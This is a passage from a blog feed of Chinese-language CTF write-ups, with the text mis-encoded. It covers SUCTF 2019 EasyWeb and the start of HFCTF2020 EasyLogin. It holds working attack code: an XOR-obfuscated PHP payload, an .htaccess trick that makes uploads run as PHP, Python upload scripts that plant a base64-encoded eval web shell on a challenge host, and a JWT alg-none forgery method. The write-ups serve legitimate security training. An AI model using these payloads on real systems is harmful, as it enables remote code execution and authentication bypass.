class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        $path= $userdir.<span class="string">&quot;/&quot;</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶ååŒ¹é…<code>ph</code>ï¼Œæ–‡ä»¶å†…å®¹åŒ¹é…<code>&lt;?</code>ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºå›¾ç‰‡ï¼Œé€šè¿‡åè¾“å‡ºå­˜æ”¾è·¯å¾„</p><h4><span id="ç¬¬äºŒå±‚">ç¬¬äºŒå±‚</span></h4><p>ç¬¬ä¸€ç‚¹ï¼šexif_imagetype()è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾å</p><blockquote><p>1ã€åœ¨å†…å®¹å‰é¢å¢åŠ GIF98aç­‰æ ‡å¿—</p><p>2ã€åœ¨æ–‡ä»¶å¼€å¤´å¢åŠ \xff\xd8ç­‰æ ‡å¿—</p><p>3ã€&gt;ä½¿ç”¨äº†xbmæ ¼å¼ï¼ŒX Bit Mapï¼Œæ¥ç»•è¿‡å›¾ç‰‡æ£€æµ‹</p><p>â€‹      &gt;ä¸€ä¸ªXMBå›¾ç‰‡æ–‡ä»¶é€šå¸¸å¦‚ä¸‹ï¼š#define width 1337 #define height 1337 static char test_bits[] = { };</p></blockquote><p>ç¬¬äºŒç‚¹ï¼šæ–‡ä»¶åç»•è¿‡</p><blockquote><p>.user.iniéœ€è¦åŒæ–‡ä»¶å¤¹ä¸‹çš„phpæ–‡ä»¶</p><p>è¿™é‡Œé€‰ç”¨.htaccess</p></blockquote><p>æ³¨æ„ï¼Œ<code>.htaccess</code>æ–‡ä»¶éœ€è¦æ ¼å¼ç¬¦åˆï¼Œå¦åˆ™ä¼š500å¼‚å¸¸ï¼›å› æ­¤é€‰ç”¨xbmç»•è¿‡ï¼Œæ­¤æ–‡ä»¶å¤´ä¼šè¢«è®¤ä¸ºæ˜¯æ³¨é‡Š</p><p>ç¬¬ä¸‰ç‚¹ï¼šæ–‡ä»¶å†…å®¹ç»•è¿‡</p><blockquote><p>è„šæœ¬ç¼–ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_flag zend.multibyte 1 å¯ç”¨ç¼–ç </span><br><span class="line">php_value zend.script_encoding &#39;UTF-8&#39; è®¾ç½®ç¼–ç </span><br><span class="line">php_value auto_append_file æ‰€æœ‰æ–‡ä»¶åº•éƒ¨åŒ…å«</span><br></pre></td></tr></table></figure></blockquote><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%A0%B8%BA%AB^%ff%ff%ff%ff&#125;&#123;%A0&#125;();&amp;%ff&#x3D;get_the_flag</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨pythonè„šæœ¬è¿›è¡Œæ–‡ä»¶æäº¤ï¼š</p><p><strong>æ³¨æ„æ¢è¡Œï¼</strong></p><p>.htaccess</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">shell =<span class="string">&quot;AddType application/x-httpd-php .aaa \nphp_flag display_errors on \nphp_flag zend.multibyte 1 \nphp_value zend.script_encoding &#x27;UTF-8&#x27; \nphp_value auto_append_file &#x27;php://filter/convert.base64-decode/resource=1.aaa&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;\n#define  counter_width 40 \n#define  counter_height 10&quot;</span></span><br><span class="line"><span class="comment">#   GIF8!</span></span><br><span class="line"><span class="comment">#   \xff\xd8</span></span><br><span class="line"><span class="comment">#   #define  counter_width 40 \n#define  counter_height 10</span></span><br><span class="line"></span><br><span class="line">con = prefix + <span class="string">&quot;\n&quot;</span> + shell</span><br><span class="line">con = con.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://2e82df58-e85e-48ab-833b-22a31a8f041d.node4.buuoj.cn:81/?_=$&#123;%ff%ff%ff%ff^%A0%B8%BA%AB&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0&#x27;</span>&#125;</span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;.htaccess&#x27;</span>, con, <span class="string">&#x27;image/x-xbitmap&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url=url, headers=headers, files=files)</span><br><span class="line"></span><br><span class="line">res = response.text</span><br><span class="line">print(res)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>AddType application/x-httpd-php .aaa     åç¼€.aaaè§£æä¸ºphp</p><p>auto_append_file â€˜php://filter/convert.base64-decode/resource=1.aaaâ€™    <strong>åŒ…å«æ–‡ä»¶å¯ä»¥ç”¨åè®®å¤„ç†æ•°æ®æµ</strong></p></blockquote><p>ç¼–ç è®¾ç½®å¤ªéº»çƒ¦äº†ï¼Œå­¦ä¹ äº†ç”¨åè®®è¯»å…¥â€¦â€¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding : utf-8</span></span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> partial</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">shell = <span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydvayddKSA/Pg==&quot;</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;GIF8!&quot;</span></span><br><span class="line"><span class="comment">#   GIF8!</span></span><br><span class="line"><span class="comment">#   \xff\xd8</span></span><br><span class="line"><span class="comment">#   #define  counter_width 40 \n#define  counter_height 10</span></span><br><span class="line"></span><br><span class="line">con = prefix + <span class="string">&quot;\n&quot;</span> + shell</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://2e82df58-e85e-48ab-833b-22a31a8f041d.node4.buuoj.cn:81/?_=$&#123;%ff%ff%ff%ff^%A0%B8%BA%AB&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0&#x27;</span>&#125;</span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.aaa&#x27;</span>, con, <span class="string">&#x27;image/png&#x27;</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url=url, headers=headers, files=files)</span><br><span class="line"></span><br><span class="line">res = response.text</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><h4><span id="ç¬¬ä¸‰å±‚">ç¬¬ä¸‰å±‚</span></h4><p>è·å–shellåï¼Œå‘ç°ä¸èƒ½è·¨ç›®å½•ä¸å‘½ä»¤æ‰§è¡Œâ€¦â€¦åˆåˆ°äº†ææ€–çš„ç»•disable function æ—¶é—´â€¦â€¦</p><p>â€¦â€¦</p><p><img src="/images/SUCTF-2019-EasyWeb/image-20210822151133816.png" alt="image-20210822151133816"></p><p><img src="/images/SUCTF-2019-EasyWeb/image-20210822151143300.png" alt="image-20210822151143300"></p><p><img src="/images/SUCTF-2019-EasyWeb/image-20210822151154733.png" alt="image-20210822151154733"></p><p><strong>èšå‰‘è¿˜æ˜¯å¼ºå•Šï¼</strong></p><p>å‚è€ƒæ–‡ç« :<br><a href="https://blog.csdn.net/mochu7777777/article/details/104631142">æµ…è°ˆPHPä»£ç æ‰§è¡Œä¸­å‡ºç°è¿‡æ»¤é™åˆ¶çš„ç»•è¿‡æ‰§è¡Œæ–¹æ³•</a></p><p><a href="https://xz.aliyun.com/t/6042#toc-26">https://xz.aliyun.com/t/6042#toc-26</a></p><p><a href="https://www.freebuf.com/column/212817.html">ä¸€é“ç–¯ç‹‚bypassçš„é¢˜ç›®</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;æ‘˜è¦&lt;br&gt;ç»•è¿‡ä¸æ–‡ä»¶ä¸Šä¼ &lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>HFCTF2020-EasyLogin</title>
    <link href="http://example.com/2021/08/18/HFCTF2020-EasyLogin/"/>
    <id>http://example.com/2021/08/18/HFCTF2020-EasyLogin/</id>
    <published>2021-08-18T08:29:22.741Z</published>
    <updated>2021-08-31T03:41:27.228Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æ‘˜è¦<br>jwt ä¼ªé€ ï¼Œä¸€ä¸‹å†™å¥½é•¿â€¦â€¦emï¼Œåœ†æ»¡</p><a id="more"></a></blockquote><div class="toc" tabindex="1"><!-- toc --><ul><li><a href="#%E6%8E%A2%E7%B4%A2">æ¢ç´¢</a></li><li><a href="#%E5%8F%8D%E6%8E%A8">åæ¨</a><ul><li><a href="#koa-%E6%A1%86%E6%9E%B6">koa æ¡†æ¶</a></li><li><a href="#controller"><strong>controller</strong>ï¼Ÿ</a><ul><li><a href="#mvc-%E7%9A%84-c-controller"><strong>MVC çš„ C â€“ controller</strong></a></li><li><a href="#rest-api"><strong>REST api</strong></a></li></ul></li><li><a href="#%E7%BB%8F%E9%AA%8C">ç»éªŒ</a></li></ul></li><li><a href="#%E4%BC%AA%E9%80%A0">ä¼ªé€ </a><ul><li><a href="#%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E7%9A%84-jwt-%E5%BA%93">æ˜“å—æ”»å‡»çš„ JWT åº“</a></li><li><a href="#%E7%BB%95%E8%BF%87%E4%B8%8E%E5%85%B6%E5%8E%9F%E7%90%86">ç»•è¿‡ä¸å…¶åŸç†</a></li></ul></li></ul><!-- tocstop --></div><br><h4><span id="æ¢ç´¢">æ¢ç´¢</span></h4><p>æœ‰/login /register /home é¡µé¢</p><p>åœ¨/homeé¡µé¢getflagï¼Œæç¤º<strong>permission denied</strong> ï¼Œä¼°è®¡æ˜¯è¦adminæƒé™ï¼Œadminè´¦å·æ— æ³•æ³¨å†Œ</p><p><strong>å¼•å…¥çš„ jsï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  æˆ–è®¸è¯¥ç”¨ koa-static æ¥å¤„ç†é™æ€æ–‡ä»¶</span></span><br><span class="line"><span class="comment"> *  è·¯å¾„è¯¥æ€ä¹ˆé…ç½®ï¼Ÿä¸ç®¡äº†å…ˆå¡«ä¸ªæ ¹ç›®å½•XD</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> username = $(<span class="string">&quot;#username&quot;</span>).val();</span><br><span class="line">    <span class="keyword">const</span> password = $(<span class="string">&quot;#password&quot;</span>).val();</span><br><span class="line">    <span class="keyword">const</span> token = sessionStorage.getItem(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">    $.post(<span class="string">&quot;/api/login&quot;</span>, &#123;username, password, <span class="attr">authorization</span>:token&#125;)</span><br><span class="line">        .done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">const</span> &#123;status&#125; = data;</span><br><span class="line">            <span class="function"><span class="title">if</span>(<span class="params">status</span>)</span> &#123;</span><br><span class="line">                <span class="built_in">document</span>.location = <span class="string">&quot;/home&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .fail(<span class="function"><span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) </span>&#123;</span><br><span class="line">            alert(xhr.responseJSON.message);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> username = $(<span class="string">&quot;#username&quot;</span>).val();</span><br><span class="line">    <span class="keyword">const</span> password = $(<span class="string">&quot;#password&quot;</span>).val();</span><br><span class="line">    $.post(<span class="string">&quot;/api/register&quot;</span>, &#123;username, password&#125;)</span><br><span class="line">        .done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; token &#125; = data;</span><br><span class="line">            sessionStorage.setItem(<span class="string">&#x27;token&#x27;</span>, token);</span><br><span class="line">            <span class="built_in">document</span>.location = <span class="string">&quot;/login&quot;</span>;</span><br><span class="line">        &#125;)</span><br><span class="line">        .fail(<span class="function"><span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) </span>&#123;</span><br><span class="line">            alert(xhr.responseJSON.message);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.get(<span class="string">&#x27;/api/logout&#x27;</span>).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;status&#125; = data;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">status</span>)</span> &#123;</span><br><span class="line">            <span class="built_in">document</span>.location = <span class="string">&#x27;/login&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.get(<span class="string">&#x27;/api/flag&#x27;</span>).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;flag&#125; = data;</span><br><span class="line">        $(<span class="string">&quot;#username&quot;</span>).val(flag);</span><br><span class="line">    &#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) </span>&#123;</span><br><span class="line">        alert(xhr.responseJSON.message);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŠ“åŒ…çš„æ—¶å€™å‘ç°å¾ˆå¥‡æ€ªï¼Œä¼¼ä¹å¹¶æ²¡æœ‰è´¦æˆ·æ•°æ®ã€‚æ³¨å†Œæ—¶ä¼šç»™ä¸€ä¸ªæˆæƒ(<strong>authorization</strong>)ï¼Œbase64è§£ä¸€ä¸‹å‘ç°æ˜¯ <strong>jwt</strong>ï¼Œæ•´ä¸ªç™»å½•æµç¨‹å…¨é jwtçš„éªŒè¯ï¼Œæ‰€ä»¥éœ€è¦å¯¹jwtæœ‰æ‰€äº†è§£ã€‚</p><img src="/images/HFCTF2020-EasyLogin/image-20210818215957097.png" alt="image-20210818215957097" style="zoom:80%;"><p><img src="/images/HFCTF2020-EasyLogin/image-20210818220627087.png" alt="image-20210818220627087"></p><blockquote><p>ç™»é™†æˆåŠŸåä¼šè¿”å›ä¸€ä¸ªbase64åŠ å¯†åçš„ç”¨æˆ·æ•°æ®å’Œä¸€ä¸ªç­¾å</p></blockquote><blockquote><p>1ã€å‰åç«¯åˆ†ç¦»ï¼Œå³æœåŠ¡ç«¯å’Œå‰ç«¯åªå…³å¿ƒè‡ªå·±çš„äº‹ã€‚</p><p>2ã€ä½¿ç”¨ <strong>jwt</strong> ä½œä¸º <strong>api</strong> è®¤è¯å‡­è¯</p><p>3ã€æœåŠ¡ç«¯ä»…ä¿å­˜åŠ å¯†ç”¨çš„<strong>secret</strong></p></blockquote><blockquote><p><a href="https://www.freebuf.com/articles/web/181261.html">æ·±å…¥äº†è§£Json Web Tokenä¹‹å®æˆ˜ç¯‡ </a></p><p><strong>å°†åŠ å¯†æ–¹å¼æ”¹ä¸ºâ€™noneâ€™</strong></p><p>ä¸‹æ–‡å®æˆ˜ä¸­çš„ Juice Shop JWT issue 1 ä¾¿æ˜¯è¿™ä¸ªé—®é¢˜ã€‚ä¹‹å‰è°ˆåŠè¿‡nonsecure JWTçš„é—®é¢˜ã€‚</p><p>ç­¾åç®—æ³•ç¡®ä¿æ¶æ„ç”¨æˆ·åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¸ä¼šä¿®æ”¹JWTã€‚ä½†æ˜¯æ ‡é¢˜ä¸­çš„algå­—æ®µå¯ä»¥æ›´æ”¹ä¸ºnoneã€‚ä¸€äº›JWTåº“æ”¯æŒæ— ç®—æ³•ï¼Œå³æ²¡æœ‰ç­¾åç®—æ³•ã€‚å½“algä¸ºnoneæ—¶ï¼Œåç«¯å°†ä¸æ‰§è¡Œç­¾åéªŒè¯ã€‚å°†algæ›´æ”¹ä¸ºnoneåï¼Œä»JWTä¸­åˆ é™¤ç­¾åæ•°æ®ï¼ˆä»…æ ‡é¢˜+â€™.â€™+ payload +â€™.â€™ï¼‰å¹¶å°†å…¶æäº¤ç»™æœåŠ¡å™¨ã€‚</p></blockquote><p>æ­¤æ—¶æˆ‘ä»¬çŸ¥é“ï¼Œå¯ä»¥æ›´æ”¹åŠ å¯†æ–¹æ³•ï¼Œä¸ç”Ÿæˆç­¾åï¼Œç»•è¿‡ç­¾åéªŒè¯</p><p>ä½†è¿‡ä¸å»ï¼Œæˆ‘ä»¬è¿˜éœ€è¦çœ‹ä¸€ä¸ªä¸œè¥¿</p><h4><span id="åæ¨">åæ¨</span></h4><p>è§£é¢˜æˆ‘ä»¬è¿˜éœ€è¦çœ‹ <strong>/controllers/api.js</strong> è¿™ä¹ˆä¸ªç©æ„â€¦â€¦è¿™ä¹Ÿæ‰«ä¸å‡ºæ¥å•Šâ€¦â€¦</p><p>ä½œä¸ºä¸€ä¸ªå•¥ä¹Ÿä¸æ‡‚çš„èœé¸¡ï¼Œå¦‚æœä»ä¸€ä¸ªå¼€å‘è€…çš„è§’åº¦å»æ€è€ƒâ€¦â€¦</p><blockquote><p>ä»¥ä¸‹æ˜¯ä¸ªäººç†è§£â€¦â€¦</p></blockquote><h5><span id="koa-æ¡†æ¶">koa æ¡†æ¶</span></h5><blockquote><p>/**</p><ul><li><p>æˆ–è®¸è¯¥ç”¨ koa-static æ¥å¤„ç†é™æ€æ–‡ä»¶</p></li><li><p>è·¯å¾„è¯¥æ€ä¹ˆé…ç½®ï¼Ÿä¸ç®¡äº†å…ˆå¡«ä¸ªæ ¹ç›®å½•XD</p><p>  */</p></li></ul></blockquote><p>åœ¨å¼•å…¥çš„jsä¸­ï¼Œå¯ä»¥çœ‹åˆ° <strong>koa-static</strong>ï¼ŒæŸ¥çœ‹ä¸‹koaçš„æ¡†æ¶ç»“æ„ï¼š</p><ol><li>ä¸åŒ…å« <strong>controller</strong></li></ol><p><a href="https://segmentfault.com/q/1010000021297024">koaæ˜¯å¦æœ‰å¿…è¦å®ç°controllersï¼Ÿ å¦‚ä½•å®ç°ï¼Ÿ</a></p><ol start="2"><li>åŒ…å« <strong>controller</strong></li></ol><p><a href="https://blog.csdn.net/weixin_36554693/article/details/105683996">Koaå…¥é—¨ï¼ˆä¸€ï¼‰â€”â€” Koaé¡¹ç›®åŸºç¡€æ¡†æ¶æ­å»º</a></p><p><a href="https://blog.csdn.net/weixin_33894640/article/details/91459845">ä¸€æ­¥ä¸€æ­¥æ•™ä½ å®ŒæˆKoa2æ¥å£å¼€å‘</a></p><p><a href="https://blog.csdn.net/qq_43702430/article/details/103456209">koaåç«¯æ¨¡æ¿</a></p><ol start="3"><li>åŒ…å« <strong>controller</strong> çš„ <strong>MVC</strong> æ¶æ„</li></ol><p><a href="https://www.jianshu.com/p/47259f48c153">ä»é›¶å¼€å§‹æ­å»ºkoaåå°åŸºç¡€æ¡†æ¶</a>    <em>ï¼ˆè¿™ä¸ªå…¶å®ä¸æ˜¯å¾ˆåˆé€‚  :D</em></p><h5><span id="controller"><strong>controller</strong>ï¼Ÿ</span></h5><p>ç”±æ­¤å¯è§ koa æ¡†æ¶å¹¶æ²¡æœ‰è§„å®šcontrollerçš„å­˜åœ¨ï¼Œè€Œcontrolleråœ¨<strong>ä¸åŒè¯­å¢ƒ</strong>ä¸‹æœ‰ç€ä¸åŒçš„ä½œç”¨</p><h6><span id="mvc-çš„-c-controller"><strong>MVC çš„ C â€“ controller</strong></span></h6><blockquote><p><em><a href="https://www.cnblogs.com/ghxb/p/8427462.html">MVC äºä¸‰å±‚æ¶æ„æœ€å¤§çš„åŒºåˆ«</a></em></p><p><em><a href="https://blog.csdn.net/csh624366188/article/details/7183872">mvcä¸ä¸‰å±‚ç»“æ„ç»ˆæåŒºåˆ«</a></em></p><p>è¶æœºå¤ä¹ ä¸‹å¼€å‘æ—¶å­¦åˆ°æ¶æ„çŸ¥è¯†ğŸ˜‹</p></blockquote><img src="/images/HFCTF2020-EasyLogin/image-20210818231056478.png" alt="image-20210818231056478" style="zoom:67%;"><p>ä¸Šå›¾æ˜æ˜¾çš„æ ‡å‡ºï¼Œjavawebä¸­servletçš„ä½œç”¨æ­£æ˜¯ <strong>controller</strong></p><p><img src="/images/HFCTF2020-EasyLogin/image-20210818232015422.png" alt="image-20210818232015422"></p><p><strong>servlet</strong> ä½œä¸º <strong>jsp</strong> ä¸ <strong>Model</strong> æ•°æ®äº¤æ¢çš„å¹³å°ï¼Œä¸Šæ¥ <strong>jsp</strong>ï¼Œä¸‹æ¥ **service **ï¼ŒæŒ‰ç†æ¥è¯´æ˜¯è¿™æ ·</p><img src="/images/HFCTF2020-EasyLogin/image-20210818232341328.png" alt="image-20210818232341328" style="zoom:89%;"><blockquote><p>è¿™å›¾ä¸æ˜¯å¾ˆåˆé€‚â€¦â€¦</p></blockquote><p>è®¿é—®ä¸åŒçš„servletï¼Œä¼šä½¿ç”¨ä¸åŒçš„**ä¸šåŠ¡é€»è¾‘(service)**ï¼Œä¸šåŠ¡é€»è¾‘åˆ™æ ¹æ®åŸå­åŒ–çš„æ•°æ®è®¿é—®å±‚æŒ‡å‘ç¬¦åˆéœ€æ±‚çš„æ•°æ®æ“ä½œ</p><p>å¦‚æœå†æ¬¡ç»†åŒ–ï¼Œä»¥ä¾¿é¢å‘éœ€æ±‚çµæ´»çš„è°ƒæ•´ï¼Œæˆ–è€…<strong>å‰åç«¯åˆ†ç¦»</strong>ã€åˆä½œï¼Œåˆå‡ºç°äº† <strong>routes(è·¯ç”±)**ï¼Œè·¯ç”±å¯ä»¥è´Ÿè´£åˆ†å‘ä¸åŒçš„è¯·æ±‚ï¼Œå¤„ç†</strong>å‰ç«¯**ã€‚</p><p>è€ŒåŸºäºè·¯ç”±çš„åˆ†å‘ï¼Œ<strong>æ¥å£(api)**ï¼Œä½œä¸ºè¯·æ±‚</strong>åç«¯**æ•°æ®çš„åœ°å€ä¸æ–¹å¼ä¹Ÿå‡ºç°äº†ã€‚</p><p>ä½†æ€ä¹ˆå†™å‘¢ï¼Ÿä¸Šé¢çš„ä¾‹å­ä¸­ä¹Ÿæœ‰äººæŠŠcontrollerå†™åˆ°routeä¸­å»â€¦â€¦</p><blockquote><p>è™½ç„¶é¢˜ç›®è¯´éƒ½æ”¾æ ¹ç›®å½•â€¦â€¦</p></blockquote><h6><span id="rest-api"><strong>REST api</strong></span></h6><blockquote><p>*<a href="https://www.jianshu.com/p/75389ea9a90b">rest apiä»‹ç»</a>*ï¼šrest api æ˜¯å‰åç«¯åˆ†ç¦»æœ€ä½³å®è·µï¼Œæ˜¯å¼€å‘çš„ä¸€å¥—æ ‡å‡†æˆ–è€…è¯´æ˜¯ä¸€å¥—è§„èŒƒï¼Œä¸æ˜¯æ¡†æ¶ã€‚</p><p><strong>ä»€ä¹ˆæ˜¯RESTå‘¢?</strong></p><p>RESTæ˜¯Representational State Transferï¼ˆè¡¨ç°å±‚çŠ¶æ€è½¬ç§»ï¼‰çš„ç¼©å†™ï¼Œå®ƒæ˜¯ç”±ç½—ä¼ŠÂ·è²å°”ä¸ï¼ˆRoy Fieldingï¼‰æå‡ºçš„ï¼Œæ˜¯ç”¨æ¥æè¿°åˆ›å»ºHTTP APIçš„æ ‡å‡†æ–¹æ³•çš„ï¼Œä»–å‘ç°è¿™å››ç§å¸¸ç”¨çš„è¡Œä¸ºï¼ˆæŸ¥çœ‹ï¼ˆviewï¼‰ï¼Œåˆ›å»ºï¼ˆcreateï¼‰ï¼Œç¼–è¾‘ï¼ˆeditï¼‰å’Œåˆ é™¤ï¼ˆdeleteï¼‰ï¼‰éƒ½å¯ä»¥ç›´æ¥æ˜ å°„åˆ°HTTP ä¸­å·²å®ç°çš„GET,POST,PUTå’ŒDELETEæ–¹æ³•ã€‚</p><p>â€”â€” <em><a href="https://blog.csdn.net/qq_42611547/article/details/84346809">ä»€ä¹ˆæ˜¯REST API</a></em></p><p><a href="https://www.zhihu.com/question/28557115">æ€æ ·ç”¨é€šä¿—çš„è¯­è¨€è§£é‡ŠRESTï¼Œä»¥åŠRESTfulï¼Ÿ</a></p></blockquote><p><strong>å®é™…ä¸Šï¼Œæ¥å£å¼€å‘çš„rest apiè§„èŒƒååˆ†æ¥è¿‘ç­”æ¡ˆ</strong></p><blockquote><p><strong>å¼€å‘REST API</strong></p><p>rest-hello å·¥ç¨‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">rest-koa&#x2F;</span><br><span class="line">|</span><br><span class="line">+- .vscode&#x2F;</span><br><span class="line">|  |</span><br><span class="line">|  +- launch.json &lt;-- VSCode é…ç½®æ–‡ä»¶</span><br><span class="line">|</span><br><span class="line">+- controllers&#x2F;</span><br><span class="line">|  |</span><br><span class="line">|  +- api.js &lt;-- REST API</span><br><span class="line">|  |</span><br><span class="line">|  +- index.js &lt;-- MVC Controllers</span><br><span 